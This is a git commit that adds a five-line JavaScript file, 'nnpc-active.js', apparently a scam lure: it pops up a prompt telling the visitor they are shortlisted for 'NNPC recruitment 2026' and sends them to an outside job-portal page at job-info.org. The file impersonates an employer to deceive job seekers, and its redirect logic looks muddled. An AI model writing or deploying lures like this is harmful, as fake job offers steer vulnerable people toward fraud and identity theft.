0435765c13ffad529f83e8ade3f573cb80845318
jobxvir <banners-blinks.9g@icloud.com>
2026-05-16 12:39:40 +0100

    Create nnpc-active.js

---
+++ nnpc-active.js
@@ -0,0 +1,5 @@
+var password = 'SUBMIT APPLICATION'
+password=prompt('NNPC: Congratulations, You are among the shortlisted candidates for NNPC recruitment 2026... Click Ok to submit application now','SUBMIT APPLICATION');
+if (password != 'SUBMIT APPLICATION') {
+location.href='https://job-info.org/NNPC-Job-Portal.html';
+}
